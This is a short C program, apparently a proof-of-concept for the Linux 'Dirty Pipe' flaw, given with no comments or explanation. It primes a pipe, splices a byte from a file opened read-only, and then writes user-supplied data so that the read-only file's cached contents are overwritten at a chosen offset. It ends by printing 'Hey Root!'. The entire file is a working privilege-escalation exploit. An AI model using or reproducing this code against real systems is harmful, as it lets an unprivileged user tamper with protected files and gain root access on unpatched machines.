#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void pipePrep(int p[2]){
    if (pipe(p)){
        abort();
    }

    const unsigned size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    for (unsigned r = size; r > 0;){
        unsigned n;
        if (r > sizeof(buffer)){
            n = sizeof(buffer);
        }
        else{
            n = r;
        }
        write(p[1], buffer, n);
        r -= n;
    }

    for (unsigned r = size; r > 0;){
        unsigned n;
        if (r > sizeof(buffer)){
            n = sizeof(buffer);
        }
        else{
            n = r;
        }
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv){
    if (argc != 4){
        fprintf(stderr, "%s offset not found\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *const path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *const data = argv[3];
    const size_t data_size = strlen(data);
    const int fd = open(path, O_RDONLY);

    int p[2];
    pipePrep(p);

    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);

    nbytes = write(p[1], data, data_size);

    printf("Hey Root!\n");
    return EXIT_SUCCESS;
}
